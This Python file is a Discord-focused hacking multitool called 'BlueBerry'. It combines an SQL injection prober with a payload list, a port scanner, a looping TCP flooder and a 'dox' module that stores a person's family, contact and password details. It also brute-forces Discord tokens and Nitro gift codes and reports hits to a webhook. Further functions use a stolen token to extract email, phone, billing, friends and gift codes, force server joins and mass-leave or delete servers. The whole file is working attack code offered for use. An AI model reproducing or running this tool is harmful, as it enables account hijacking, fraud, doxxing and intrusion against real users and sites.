######################################################### 

from colorama import *
from time import *
from datetime import datetime, timezone

import os
import json
import requests
import socket
import concurrent.futures
import time
import string
import random
import threading

w = Fore.WHITE
b = Fore.BLACK
bl = Fore.BLUE
r = Fore.RESET

#########################################################

class API:
    def __init__(self):
        self.sql_message_error = [
            "SQL syntax", "SQL error", "MySQL", "mysql", "MySQLYou",
            "Unclosed quotation mark", "SQLSTATE", "syntax error", "ORA-", 
            "SQLite", "PostgreSQL", "Truncated incorrect", "Division by zero",
            "You have an error in your SQL syntax", "Incorrect syntax near", 
            "SQL command not properly ended", "sql", "Sql", "Warning", "Error"
        ]

        self.sql_provocation_error = [
            "'", '"', "''", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR 1=1 --",
            "' OR 1=1 /*", "' OR 'a'='a", "' OR 'a'='a' --", "' OR 'a'='a' /*", "' OR ''='", "admin'--", "admin' /*",
            "' OR 1=1#", "' OR '1'='1' (", "') OR ('1'='1", "'; EXEC xp_cmdshell('dir'); --", "' UNION SELECT NULL, NULL, NULL --", 
            "' OR 1=1 --", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR 1=1#", "' OR 1=1/*", 
            "' OR 'a'='a'#", "' OR 'a'='a'/*", "' OR ''=''", "' OR '1'='1'--", "admin' --", "admin' #", "' OR 1=1--", "' OR 1=1/*", 
            "' OR 'a'='a'--", "' OR ''=''", "' OR 'x'='x'", "' OR 'x'='x'--", "' OR 'x'='x'/*", "' OR x=x--", "' OR x=x/*", 
            "' OR 'x'='x'--", "' OR 1=1--", "' OR 1=1/*", "' OR 'a'='a'--", "' OR ''=''", "' OR 'x'='x'", "' OR 'x'='x'--", "' OR 'x'='x'/*"
        ]

    def detect_sql_error(self, url):
        vulnerability = False
        error = None
        provocation = None

        try:
            for provocation_error in self.sql_provocation_error:
                test_url = url + provocation_error
                
                response = requests.get(test_url, timeout=3)
                response_status = response.status_code
                
                if response_status == 200:
                    for message_error in self.sql_message_error:
                        if message_error in response.text:
                            vulnerability = True
                            error = message_error
                            provocation = provocation_error
                            break
                    if vulnerability:
                        break
        except Exception as e:
            print(f"An error occurred: {e}")

        if vulnerability:
            print(f"{bl}[{w}+{bl}] {w}Vulnerability SQL: {bl}{vulnerability}{w} | Error Found: {bl}{error}{w} | Provocation: {bl}{provocation}{w}")
        else: 
            print(f"{bl}[{w}-{bl}] {w}Vulnerability SQL: {bl}{vulnerability}{w} | Error Found: {bl}{error}{w} | Provocation: {bl}{provocation}{w}")

        return vulnerability
    
    def port_scanner(self, ip):
        port_protocol_map = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 69: "TFTP",
            80: "HTTP", 110: "POP3", 123: "NTP", 143: "IMAP", 194: "IRC", 389: "LDAP",
            443: "HTTPS", 161: "SNMP", 3306: "MySQL", 5432: "PostgreSQL", 6379: "Redis",
            1521: "Oracle DB", 3389: "RDP"
        }

        def scan_port(ip, port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    protocol = self.identify_protocol(ip, port)
                    print(f"{bl}[{w}+{bl}] {w}Port: {bl}{port}{w} Status: {bl}Open{w} Protocol: {bl}{protocol}{w}")
                else:
                   print(f"{bl}[{w}-{bl}] {w}Status: {bl}Protected{w}") 
                sock.close()
            except:
                pass

        def identify_protocol(ip, port):
            try:
                if port in port_protocol_map:
                    return port_protocol_map[port]
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect((ip, port))
                    
                    sock.send(b"GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(ip).encode('utf-8'))
                    response = sock.recv(100).decode('utf-8')
                    if "HTTP" in response:
                        return "HTTP"
                    
                    sock.send(b"\r\n")
                    response = sock.recv(100).decode('utf-8')
                    if "FTP" in response:
                        return "FTP"
                    
                    sock.send(b"\r\n")
                    response = sock.recv(100).decode('utf-8')
                    if "SSH" in response:
                        return "SSH"

                    return "Unknown"
            except:
                return "Unknown"

        with concurrent.futures.ThreadPoolExecutor() as executor:
            results = {executor.submit(scan_port, ip, port): port for port in range(1, 65535 + 1)}
        concurrent.futures.wait(results)
    def ping_ip(self, hostname, port, bytes):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            start_time = time.time()
            sock.connect((hostname, port))
            data = b'\x00' * bytes
            sock.sendall(data)
            end_time = time.time()
            elapsed_time = (end_time - start_time) * 1000
            print(f'{bl}[{w}+{bl}] {w}Hostname: {bl}{hostname}{w} time: {bl}{elapsed_time:.2f}ms{w} port: {bl}{port}{w} bytes: {bl}{bytes}{w} status: {bl}succeed{w}')
        except:
            elapsed_time = 0
            print(f'{bl}[{w}-{bl}] {w}Hostname: {bl}{hostname}{w} time: {bl}{elapsed_time}ms{w} port: {bl}{port}{w} bytes: {bl}{bytes}{w} status: {bl}fail{w}')
    def info_discord(self):
        discord_info = {}
        discord_info['Username'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Discord Username -> ")
        discord_info['ID'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Discord ID -> ")
        discord_info['Token'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Discord Token -> ")
        discord_info['Phone'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Discord Phone -> ")
        discord_info['Nitro'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Discord Nitro Status -> ")
        return discord_info
    def info_all(self):
        all_info = {}
        all_info['Ip'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter IP Address -> ")
        all_info['VPN'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter VPN Status -> ")
        all_info['Phone'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Phone Number -> ")
        all_info['Gender'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Gender -> ")
        all_info['Last Name'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Last Name -> ")
        all_info['First Name'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter First Name -> ")
        all_info['Age'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Age -> ")
        all_info['Mother'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Mother's Name -> ")
        all_info['Father'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Father's Name -> ")
        all_info['Brother'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Brother's Name -> ")
        all_info['Sister'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Sister's Name -> ")
        all_info['Country'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Country -> ")
        all_info['City'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter City -> ")
        all_info['Email'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Email Address -> ")
        all_info['Password'] = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Password -> ")
        return all_info
    def save_info_to_json(self, discord_info, all_info):
        username = discord_info.get('Username', 'unknown_user')
        tracker_dir = 'dox'
        file_name = os.path.join(tracker_dir, f"{username}.json")

        # Create directories if they don't exist
        os.makedirs(tracker_dir, exist_ok=True)

        # Prepare data for saving
        data = {
            "Discord Info": discord_info,
            "All Info": all_info
        }

        # Write data to JSON file
        with open(file_name, 'w') as json_file:
            json.dump(data, json_file, indent=4)
        print(f"\n{bl}[{bl}{w}+{bl}] {w}Information saved to {file_name}")
    def joiner(self, token, invite):
        invite_code = invite.split("/")[-1]

        try:
            response = requests.get(f"https://discord.com/api/v9/invites/{invite_code}")
            if response.status_code == 200:
                server_name = response.json().get('guild', {}).get('name')
            else:
                server_name = invite
        except:
            server_name = invite

        try:
            response = requests.post(f"https://discord.com/api/v9/invites/{invite_code}", headers={'Authorization': token})
                
            if response.status_code == 200:
                print(f"{bl}[{bl}{w}+{bl}] {w}Status: {bl}Joined{w} Server: {bl}{server_name}{w}")
            else:
                print(f"{bl}[{bl}{w}-{bl}] {w}Status: {bl}Error {response.status_code}{w} Server: {bl}{server_name}{w}")
        except:
            print(f"{bl}[{bl}{w}!{bl}] {w}Status: {bl}Error{w} Server: {bl}{server_name}{w}")
    def find_tracker(self):
        tracker_dir = 'dox'
        if not os.path.exists(tracker_dir):
            print(f"{bl}[{bl}{w}!{bl}] {w}No directory named {bl}{tracker_dir} {w}found.")
            return

        files = [f for f in os.listdir(tracker_dir) if f.endswith('.json')]
        if not files:
            print(f"{bl}[{bl}{w}!{bl}] {w}No JSON files found in the {bl}tracker {w}directory.")
            return

        print(f"\n{bl}[{bl}{w}+{bl}] {w}Available trackers ->\n")
        for i, file in enumerate(files, 1):
            print(f"{bl}[{w}{i}{bl}] {w}{file}")

        try:
            choice = int(input(f"\n{bl}[{bl}{w}+{bl}] {w}Choose a tracker number -> ")) - 1
            if 0 <= choice < len(files):
                file_path = os.path.join(tracker_dir, files[choice])
                with open(file_path, 'r') as json_file:
                    data = json.load(json_file)
                    print(f"\n{w}+{bl}─────────── {w}Discord {bl}──────────{w}+")
                    discord_info = data.get("Discord Info", {})
                    for key, value in discord_info.items():
                        print(f"{bl}[{bl}{w}+{bl}] {w}{key}: {bl}{value}")

                    print(f"\n{w}+{bl}─────────── {w}All {bl}──────────{w}+")
                    all_info = data.get("All Info", {})
                    for key, value in all_info.items():
                        print(f"{bl}[{bl}{w}+{bl}] {w}{key}: {bl}{value}")
            else:
                print(f"{bl}[{bl}{w}-{bl}] {w}Invalid choice.")
        except ValueError:
            print(f"{bl}[{bl}{w}+{bl}] {w}Please enter a valid number.")

    def discord_token_generator(self):
        webhook = input(f"\n{bl}[{bl}{w}?{bl}] {w}Webhook? (y/n) -> ")
        if webhook in ['y', 'Y', 'Yes', 'yes', 'YES']:
            webhook_url = input(f"{bl}[{bl}{w}?{bl}] {w}Webhook URL -> ")
            self.check_webhook(webhook_url)

        try:
            threads_number = int(input(f"{bl}[{bl}{w}+{bl}] {w}Threads Number -> "))
        except ValueError:
            print(f"{bl}[{bl}{w}-{bl}] {w}Invalid number for threads")
            return

        def send_webhook(embed_content):
            payload = {
                'embeds': [embed_content],
                'username': 'BlueBerry',
                'avatar_url': 'https://i.imgur.com/AfFp7pu.png'
            }

            headers = {
                'Content-Type': 'application/json'
            }

            requests.post(webhook_url, data=json.dumps(payload), headers=headers)

        def token_check():
            first = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([24, 26])))
            second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(6))
            third = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(38))
            token = f"{first}.{second}.{third}"

            try:
                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
                if 'username' in user:
                    if webhook in ['y']:
                        embed_content = {
                            'title': 'Token Valid!',
                            'description': f"**__Token:__**\n```{token}```",
                            'color': 65280,
                            'footer': {
                                "text": "BlueBerry",
                                "icon_url": "https://i.imgur.com/AfFp7pu.png",
                            }
                        }
                        send_webhook(embed_content)
                    print(f"{bl}[{bl}{w}+{bl}] {bl}[VALID] {w}Token: {bl}{token}")
                else:
                    print(f"{bl}[{bl}{w}-{bl}] {bl}[INVALID] {w}Token: {bl}{token}")
            except:
                print(f"{bl}[{bl}{w}!{bl}] {bl}[ERROR] {w}Token: {bl}{token}")

        def request():
            threads = []
            for _ in range(threads_number):
                t = threading.Thread(target=token_check)
                t.start()
                threads.append(t)

            for thread in threads:
                thread.join()

        while True:
            request()
        
    def discord_nitro_generator(self):
        webhook = input(f"\n{bl}[{bl}{w}?{bl}] {w}Webhook? (y/n) -> ")
        if webhook.lower() in ['y', 'yes']:
            webhook_url = input(f"{bl}[{bl}{w}+{bl}] {w}Webhook URL -> ")
            self.check_webhook(webhook_url)

        try:
            threads_number = int(input(f"{bl}[{bl}{w}+{bl}] {w}Threads Number -> "))
        except ValueError:
            print(f"{bl}[{bl}{w}-{bl}] {w}Invalid number for threads")
            return

        def send_webhook(embed_content):
            payload = {
                'embeds': [embed_content],
                'username': 'BlueBerry',
                'avatar_url': 'https://i.imgur.com/AfFp7pu.png'
            }

            headers = {
                'Content-Type': 'application/json'
            }

            requests.post(webhook_url, data=json.dumps(payload), headers=headers)

        def nitro_check():
            code_nitro = ''.join([random.choice(string.ascii_uppercase + string.digits) for _ in range(16)])
            url_nitro = f'https://discord.gift/{code_nitro}'
            response = requests.get(f'https://discordapp.com/api/v6/entitlements/gift-codes/{code_nitro}?with_application=false&with_subscription_plan=true', timeout=1)
            if response.status_code == 200:
                if webhook.lower() in ['y', 'yes']:
                    embed_content = {
                        'title': 'Nitro Valid!',
                        'description': f"**__Nitro:__**\n```{url_nitro}```",
                        'color': 65280,
                        'footer': {
                            "text": "BlueBerry",
                            "icon_url": "https://i.imgur.com/AfFp7pu.png",
                        }
                    }
                    send_webhook(embed_content)
                print(f"{bl}[{bl}{w}+{bl}] {bl}[VALID] {w}Nitro: {bl}{url_nitro}")
            else:
                print(f"{bl}[{bl}{w}-{bl}] {bl}[INVALID] {w}Nitro: {bl}{url_nitro}")

        def request():
            threads = []
            for _ in range(threads_number):
                t = threading.Thread(target=nitro_check)
                t.start()
                threads.append(t)

            for thread in threads:
                thread.join()

        while True:
            request()

    def check_webhook(self, webhook_url):
        try:
            response = requests.get(webhook_url)
            if response.status_code == 200:
                print(f"{bl}[{bl}{w}+{bl}] {w}Webhook is valid!")
            else:
                print(f"{bl}[{bl}{w}-{bl}] {w}Webhook is not valid!")
        except requests.exceptions.RequestException as e:
            print(f"{bl}[{bl}{w}-{bl}] {w}Error validating webhook: {e}")
    def retrieve_discord_information(self):
        try:
            print()
            token_discord = self.Choice1TokenDiscord()
            print(f"{bl}[{bl}{w}/{bl}] {w}Information Recovery..")

            api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord}).json()

            response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord, 'Content-Type': 'application/json'})
            status = "Valid" if response.status_code == 200 else "Invalid"

            username_discord = api.get('username', "None") + '#' + api.get('discriminator', "None")
            display_name_discord = api.get('global_name', "None")
            user_id_discord = api.get('id', "None")
            email_discord = api.get('email', "None")
            email_verified_discord = api.get('verified', "None")
            phone_discord = api.get('phone', "None")
            mfa_discord = api.get('mfa_enabled', "None")
            country_discord = api.get('locale', "None")
            avatar_discord = api.get('avatar', "None")
            avatar_decoration_discord = api.get('avatar_decoration_data', "None")
            public_flags_discord = api.get('public_flags', "None")
            flags_discord = api.get('flags', "None")
            banner_discord = api.get('banner', "None")
            banner_color_discord = api.get('banner_color', "None")
            accent_color_discord = api.get("accent_color", "None")
            nsfw_discord = api.get('nsfw_allowed', "None")

            try:
                created_at_discord = datetime.fromtimestamp(((int(api.get('id', 'None')) >> 22) + 1420070400000) / 1000, timezone.utc)
            except:
                created_at_discord = "None"

            nitro_discord = self.get_nitro_status(api)

            avatar_url_discord = self.get_avatar_url(user_id_discord, api)

            linked_users_discord = self.get_linked_users(api)

            bio_discord = self.get_bio(api)

            authenticator_types_discord = self.get_authenticator_types(api)

            guild_count, owner_guild_count, owner_guilds_names = self.get_guild_info(token_discord)

            payment_methods_discord = self.get_payment_methods(token_discord)

            friends_discord = self.get_friends(token_discord)

            gift_codes_discord = self.get_gift_codes(token_discord)

            self.print_discord_info(
                status, token_discord, username_discord, display_name_discord, user_id_discord,
                created_at_discord, country_discord, email_discord, email_verified_discord,
                phone_discord, nitro_discord, linked_users_discord, avatar_decoration_discord,
                avatar_discord, avatar_url_discord, accent_color_discord, banner_discord,
                banner_color_discord, flags_discord, public_flags_discord, nsfw_discord,
                mfa_discord, authenticator_types_discord, payment_methods_discord,
                gift_codes_discord, guild_count, owner_guild_count, owner_guilds_names,
                bio_discord, friends_discord
            )

        except Exception as e:
            print(e)

    def get_nitro_status(self, api):
        try:
            premium_type = api.get('premium_type', 'None')
            if premium_type == 0:
                return 'False'
            elif premium_type == 1:
                return 'Nitro Classic'
            elif premium_type == 2:
                return 'Nitro Boosts'
            elif premium_type == 3:
                return 'Nitro Basic'
            else:
                return 'False'
        except:
            return "None"

    def get_avatar_url(self, user_id_discord, api):
        try:
            avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{api['avatar']}.gif"
            if requests.get(avatar_url_discord).status_code != 200:
                avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{api['avatar']}.png"
            return avatar_url_discord
        except:
            return "None"

    def get_linked_users(self, api):
        try:
            linked_users_discord = api.get('linked_users', 'None')
            linked_users_discord = ' / '.join(linked_users_discord)
            if not linked_users_discord.strip():
                linked_users_discord = "None"
            return linked_users_discord
        except:
            return "None"

    def get_bio(self, api):
        try:
            bio_discord = "\n" + api.get('bio', 'None')
            if not bio_discord.strip() or bio_discord.isspace():
                bio_discord = "None"
            return bio_discord
        except:
            return "None"

    def get_authenticator_types(self, api):
        try:
            authenticator_types_discord = api.get('authenticator_types', 'None')
            authenticator_types_discord = ' / '.join(authenticator_types_discord)
            return authenticator_types_discord
        except:
            return "None"

    def get_guild_info(self, token_discord):
        try:
            guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token_discord})
            if guilds_response.status_code == 200:
                guilds = guilds_response.json()
                guild_count = len(guilds)
                owner_guilds = [guild for guild in guilds if guild['owner']]
                owner_guild_count = f"({len(owner_guilds)})"
                owner_guilds_names = "\n" + "\n".join([f"{guild['name']} ({guild['id']})" for guild in owner_guilds])
                return guild_count, owner_guild_count, owner_guilds_names
            else:
                return "None", "None", "None"
        except:
            return "None", "None", "None"

    def get_payment_methods(self, token_discord):
        try:
            billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_discord}).json()
            if billing_discord:
                payment_methods_discord = []
                for method in billing_discord:
                    if method['type'] == 1:
                        payment_methods_discord.append('CB')
                    elif method['type'] == 2:
                        payment_methods_discord.append("Paypal")
                    else:
                        payment_methods_discord.append('Other')
                return ' / '.join(payment_methods_discord)
            else:
                return "None"
        except:
            return "None"

    def get_friends(self, token_discord):
        try:
            friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token_discord}).json()
            if friends:
                friends_discord = []
                for friend in friends:
                    data = f"{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})"
                    if len('\n'.join(friends_discord)) + len(data) >= 1024:
                        break
                    friends_discord.append(data)
                return '\n'.join(friends_discord) if friends_discord else "None"
            else:
                return "None"
        except:
            return "None"

    def get_gift_codes(self, token_discord):
        try:
            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token_discord}).json()
            if gift_codes:
                codes = []
                for gift_code in gift_codes:
                    name = gift_code['promotion']['outbound_title']
                    code = gift_code['code']
                    codes.append(f"Gift: {name}\nCode: {code}")
                return '\n'.join(codes) if codes else "None"
            else:
                return "None"
        except:
            return "None"

    def print_discord_info(self, *info):
        info_labels = [
            "Status", "Token", "Username", "Display Name", "Id", "Created",
            "Country", "Email", "Verified", "Phone", "Nitro", "Linked Users",
            "Avatar Decor", "Avatar", "Avatar URL", "Accent Color", "Banner",
            "Banner Color", "Flags", "Public Flags", "NSFW", "Multi-Factor Authentication",
            "Authenticator Type", "Billing", "Gift Code", "Guilds", "Owner Guilds",
            "Bio", "Friend"
        ]
        print("\n".join(f"{bl}[{bl}{w}+{bl}] {w}{label}: {bl}{value}" for label, value in zip(info_labels, info)))

    def leave_guilds(self):
        try:
            token = self.Choice1TokenDiscord()
            guilds_id = requests.get("https://discord.com/api/v8/users/@me/guilds", headers={'Authorization': token}).json()
            
            if not guilds_id:
                print(f"{bl}[{bl}{w}+{bl}] {w}No Server found.")
                return

            for guild_batch in [guilds_id[i:i+3] for i in range(0, len(guilds_id), 3)]:
                self.leaver(guild_batch, token)

        except Exception as e:
            print(e)

    def leaver(self, guilds, token):
        for guild in guilds:
            try:
                response = requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild["id"]}', headers={'Authorization': token})
                
                if response.status_code in [200, 204]:
                    print(f"{bl}[{bl}{w}+{bl}] {w}Leave Server: {bl}{guild['name']}{w} - Status: {bl}Leave")
                elif response.status_code == 400:
                    response = requests.delete(f'https://discord.com/api/v8/guilds/{guild["id"]}', headers={'Authorization': token})
                    if response.status_code in [200, 204]:
                        print(f"{bl}[{bl}{w}+{bl}] {w}Leave Server: {bl}{guild['name']}{w} - {bl}Status: Leave")
                    else:
                        print(f"{bl}[{bl}{w}-{bl}] {w}Error {bl}{response.status_code} {w}Server: {bl}{guild['name']}")
                else:
                    print(f"{bl}[{bl}{w}-{bl}] {w}Error {bl}{response.status_code} {w}Server: {bl}{guild['name']}")

            except Exception as e:
                print(f"{bl}[{bl}{w}-{bl}] {w}Error: {e}")

    def cycle_statuses(self):
        try:
            print()
            token = self.Choice1TokenDiscord()

            try:
                statue_number = int(input(f"{bl}[{bl}{w}-{bl}] {w}How many statuses do you want to cycle (max 4) -> {r}"))
            except:
                print(f"{bl}[{bl}{w}!{bl}] {w}Error")
                return

            if statue_number < 1 or statue_number > 4:
                print(f"{bl}[{bl}{w}!{bl}] {w}Try number")
                return

            statues = []

            for i in range(statue_number):
                choice = str(input(f"{bl}[{bl}{w}-{bl}] {w}Custom Status {i+1} -> {r}"))
                statues.append(choice)

            headers = {'Authorization': token, 'Content-Type': 'application/json'}

            while True:
                for status in statues:
                    CustomStatus = {"custom_status": {"text": status}}
                    try:
                        r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus)
                        if r.status_code == 200:
                            print(f"{bl}[{bl}{w}+{bl}] {w}Status: {bl}Changed {r}| {w}Status Discord: {bl}{status}")
                        else:
                            print(f"{bl}[{bl}{w}!{bl}] {w}Error changing status: {bl}{r.status_code}")
                        sleep(5)
                    except Exception as e:
                        print(f"{bl}[{bl}{w}-{bl}] {w}Error: {e}")
                        sleep(5)
        except Exception as e:
            self.Error(e)

    def Choice1TokenDiscord(self):
        token = input(f"{bl}[{bl}{w}+{bl}] {w}Token -> ")
        return token





#########################################################

text = f"""
 


                        {w}██████{bl}╗ {w}██{bl}╗     {w}██{bl}╗   {w}██{bl}╗{w}███████{bl}╗    {w}██████{bl}╗ {w}███████{bl}╗{w}██████{bl}╗ {w}██████{bl}╗ {w}██{bl}╗   {w}██{bl}╗
                        {w}██{bl}╔══{w}██{bl}╗{w}██{bl}║     {w}██{bl}║   {w}██{bl}║{w}██{bl}╔════╝    {w}██{bl}╔══{w}██{bl}╗{w}██{bl}╔════╝{w}██{bl}╔══{w}██{bl}╗{w}██{bl}╔══{w}██{bl}╗╚{w}██{bl}╗ {w}██{bl}╔╝
                        {w}██████{bl}╔╝{w}██{bl}║     {w}██{bl}║   {w}██{bl}║{w}█████{bl}╗{w}█████{bl}╗{w}██████{bl}╔╝{w}█████{bl}╗  {w}██████{bl}╔╝{w}██████{bl}╔╝ ╚{w}████{bl}╔╝ 
                        {w}██{bl}╔══{w}██{bl}╗{w}██{bl}║     {w}██{bl}║   {w}██{bl}║{w}██{bl}╔══╝╚════╝{w}██{bl}╔══{w}██{bl}╗{w}██{bl}╔══╝  {w}██{bl}╔══{w}██{bl}╗{w}██{bl}╔══{w}██{bl}╗  ╚{w}██{bl}╔╝  
                        {w}██████{bl}╔╝{w}███████{bl}╗╚{w}██████{bl}╔╝{w}███████{bl}╗    {w}██████{bl}╔╝{w}███████{bl}╗{w}██{bl}║  {w}██{bl}║{w}██{bl}║  {w}██{bl}║   {w}██{bl}║   
                        {bl}╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   

                                                      [{bl}{w}0{bl}] {w}Star

                                           {bl}[{w}0{bl}] {w}Token           {bl}[{w}Creator{bl}] {w}Kara

                              {bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═{w}═{bl}═

               {bl}[{w}1{bl}] {w}Sql Vulnerability Scanner    {bl}[{w}5{bl}] {w}Dox Create           {bl}[{w}9{bl}] {w}Token Info     {bl}[{w}13{bl}] {w}Webhook Info
               {bl}[{w}2{bl}] {w}Ip Port Scanner              {bl}[{w}6{bl}] {w}Dox Tracker          {bl}[{w}10{bl}] {w}Token Join    {bl}[{w}14{bl}] {w}Webhook Delete
               {bl}[{w}3{bl}] {w}Ip Pinger                    {bl}[{w}7{bl}] {w}Token Generator      {bl}[{w}11{bl}] {w}Token Leave   {bl}[{w}15{bl}] {w}Webhook Spammer
               {bl}[{w}4{bl}] {w}DataBase                     {bl}[{w}8{bl}] {w}Nitro Generator      {bl}[{w}12{bl}] {w}Token Status  {bl}[{w}E{bl}] {w}Exit
"""

def bbui():
    os.system("title BlueBerry")
    os.system("cls")

def main():
    bbui()
    print(text)
    choose = int(input(f"{bl}[{bl}{w}?{bl}] {w}-> {r}"))

    if choose == 1:
        SQL_VULNERABILITY_SCANNER()

    if choose == 2:
        IP_PORT_SCANNER()

    if choose == 3:
        IP_PORT_PINGER()
    
    if choose == 4:
        print("Maintenance")
        sleep(2)
        main()
    
    if choose == 5:
        DOX_CREATE()
    
    if choose == 6:
        DOX_TRACKER()
    
    if choose == 7:
        TOKEN_GEN()
    
    if choose == 8:
        NITRO_GEN()
    
    if choose == 9:
        TOKEN_INFO()
    
    if choose == 10:
        TOKEN_JOIN()
    
    if choose == 11:
        TOKEN_LEAVE()
    
    if choose == 12:
        TOKEN_STATUS()
    
    if choose == 13:
        print("Maintenance")
        sleep(2)
        main()
    
    if choose == 14:
        print("Maintenance")
        sleep(2)
        main()
    
    if choose == 15:
        print("Maintenance")
        sleep(2)
        main()


    else:
        exit()






#########################################################

# 1 - 4

def SQL_VULNERABILITY_SCANNER():
    api = API()
    website_url = input(f"\n{bl}[{w}?{bl}] {w}Website Url -> {r}")

    print(f"{bl}[{w}/{bl}] {w}Looking for a vulnerability..")
    if "https://" not in website_url and "http://" not in website_url:
        website_url = "https://" + website_url

    sleep(2)
    api.detect_sql_error(website_url)
    input(f"\n{bl}[{bl}{w}?{bl}] {w}-> Revenir au menu principal {bl}[{w}Enter{bl}]{r}")
    main()

def IP_PORT_SCANNER():
    api = API()
    ip = input(f"\n{bl}[{w}?{bl}] {w}Input IP -> ")
    print(f"{bl}[{w}/{bl}] {w}Scanning..")

    api.port_scanner(ip)

    input(f"\n{bl}[{bl}{w}?{bl}] {w}-> Revenir au menu principal {bl}[{w}Enter{bl}]{r}")
    main()

def IP_PORT_PINGER():
    api = API()
    hostname = input(f"\n{bl}[{bl}{w}?{bl}] {w}Input IP -> ")

    port_input = input(f"{bl}[{bl}{w}?{bl}] {w}Input Port (enter for default) -> ")
    if port_input.strip():
        port = int(port_input)
    else:
        port = 80
    
    bytes_input = input(f"{bl}[{bl}{w}?{bl}] {w}Input Bytes (enter for default) -> ")
    if bytes_input.strip():
        bytes = int(bytes_input)
    else:
        bytes = 64

    while True:
        api.ping_ip(hostname, port, bytes)
        sleep(1)

#########################################################

# 5 - 8

def DOX_CREATE():
    api = API()
    print(f"\n{w}+{bl}─────────── {w}Discord {bl}──────────{w}+\n")
    discord_info = api.info_discord()
    print(f"\n{w}+{bl}─────────── {w}All {bl}──────────{w}+\n")
    all_info = api.info_all()
    api.save_info_to_json(discord_info, all_info)
    input(f"\n{bl}[{bl}{w}?{bl}] {w}-> Revenir au menu principal {bl}[{w}Enter{bl}]{r}")
    main()

def DOX_TRACKER():
    api = API()
    api.find_tracker()
    input(f"\n{bl}[{bl}{w}?{bl}] {w}-> Revenir au menu principal {bl}[{w}Enter{bl}]{r}")
    main()

def TOKEN_GEN():
    api = API()
    input(f"{bl}[{bl}{w}?{bl}] {w}Cette option peut bugé ? {bl}[{w}Continuer{bl}] {r}")
    api.discord_token_generator()
    input(f"\n{bl}[{bl}{w}?{bl}] {w}-> Revenir au menu principal {bl}[{w}Enter{bl}]{r}")
    main()

def NITRO_GEN():
    api = API()
    input(f"{bl}[{bl}{w}?{bl}] {w}Cette option peut bugé ? {bl}[{w}Continuer{bl}] {r}")
    api.discord_nitro_generator()
    input(f"\n{bl}[{bl}{w}?{bl}] {w}-> Revenir au menu principal {bl}[{w}Enter{bl}]{r}")
    main()

#########################################################

# 9 - 12

def TOKEN_INFO():
    api = API()
    api.retrieve_discord_information()

    input(f"\n{bl}[{bl}{w}?{bl}] {w}-> Revenir au menu principal {bl}[{w}Enter{bl}]{r}")
    main()

def TOKEN_JOIN():
    api = API()
    token = input(f"{bl}[{bl}{w}?{bl}] {w}Enter Discord Token -> ")
    invite = input(f"{bl}[{bl}{w}?{bl}] {w}Server Invitation -> {r}")
    api.joiner(token, invite)

    input(f"\n{bl}[{bl}{w}?{bl}] {w}-> Revenir au menu principal {bl}[{w}Enter{bl}]{r}")
    main()

def TOKEN_LEAVE():
    api = API()
    api.leave_guilds()

    input(f"\n{bl}[{bl}{w}?{bl}] {w}-> Revenir au menu principal {bl}[{w}Enter{bl}]{r}")
    main()

def TOKEN_STATUS():
    api = API()
    api.cycle_statuses()

    input(f"\n{bl}[{bl}{w}?{bl}] {w}-> Revenir au menu principal {bl}[{w}Enter{bl}]{r}")
    main()
